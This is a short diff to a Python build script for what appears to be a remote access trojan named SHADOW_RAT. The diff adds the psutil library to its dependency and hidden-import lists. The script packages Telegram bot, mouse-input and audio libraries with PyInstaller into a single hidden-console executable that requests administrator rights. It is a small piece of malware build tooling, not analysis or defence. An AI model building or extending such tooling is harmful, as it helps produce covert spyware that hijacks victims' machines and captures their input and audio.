@@ -28,6 +28,7 @@ def build_rat() -> bool:
         "requests",
         "pytelegrambotapi",
         "pillow",
+        "psutil",
         "pyaudio"
     ]
     
@@ -51,7 +52,8 @@ def build_rat() -> bool:
         "pynput.mouse",
         "telebot",
         "requests",
-        "numpy"
+        "numpy",
+        "psutil"
     ]
     
     cmd: list[str] = ["pyinstaller", "--onefile", "--noconsole", "--name=SHADOW_RAT", "--uac-admin"]
